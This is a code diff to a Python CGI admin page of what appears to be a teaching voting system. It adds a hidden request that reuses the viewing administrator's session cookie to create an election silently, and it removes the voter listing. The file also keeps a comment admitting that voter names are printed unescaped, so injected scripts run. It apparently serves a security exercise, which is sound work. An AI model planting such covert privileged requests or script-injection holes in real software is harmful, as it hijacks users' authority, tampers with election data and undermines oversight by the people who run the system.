@@ -5,6 +5,8 @@ import subprocess
 import json
 from os import environ
 from http.cookies import SimpleCookie
+import requests
+
 
 PATH_TO_MACHINE = "./etovucca"
 PATH_TO_SQLITE = "./sqlite3"
@@ -76,7 +78,6 @@ try:
             raise ValueError("Unauthorized.")
         if stored_hash != C['user'].value: # U+1F914
             raise ValueError("Unauthorized: " + C['user'].value)
-
     print('<a href="login.cgi?logout=true">Logout</a><br>')
     
     if len(form) != 0:
@@ -176,11 +177,37 @@ try:
     json_voters = subprocess.check_output([PATH_TO_MACHINE, "get-voters"]).decode('utf-8')
     voters = json.loads(json_voters)
     print('<ul>')
+    admin_password = C['user'].value
+    url = "http://localhost:8000/cgi-bin/admin.cgi"
+    cookies = {"user": admin_password}
+    params = {"addElection": "1999-12-12"}
+    
+    # Add headers to prevent redirects
+    headers = {
+        'Accept': 'application/json',  # Prefer JSON response
+        'X-Requested-With': 'XMLHttpRequest'  # Indicate this is an AJAX request
+    }
+    
+    try:
+        # Set allow_redirects=False to prevent following redirects
+        response = requests.post(
+            url, 
+            cookies=cookies, 
+            params=params,
+            headers=headers,
+            allow_redirects=False
+        )
+        # Check if the request was successful
+        response.raise_for_status()
+    except requests.exceptions.RequestException as e:
+        print(f"Error making request: {e}")
+        raise
+
     for voter in voters:
         # Printing this will execute malicious scripts inserted by users in the voter name field
         result = subprocess.run(['./name_helper.py', voter['name']], capture_output=True, text=True)
-        print('<li>{} ({}): {}, {}'.format(voter['name'], voter['dob'], voter['county'], voter['zip']))
-        print('<div style="display:none;">{}</div></li>'.format(result.stdout))
+        # print('<li>{} ({}): {}, {}'.format(voter['name'], voter['dob'], voter['county'], voter['zip']))
+        # print('<div style="display:none;">{}</div></li>'.format(result.stdout))
     print('</ul>')
 except subprocess.CalledProcessError as e:
     print('<br><b>Error rendering interface:</b>')
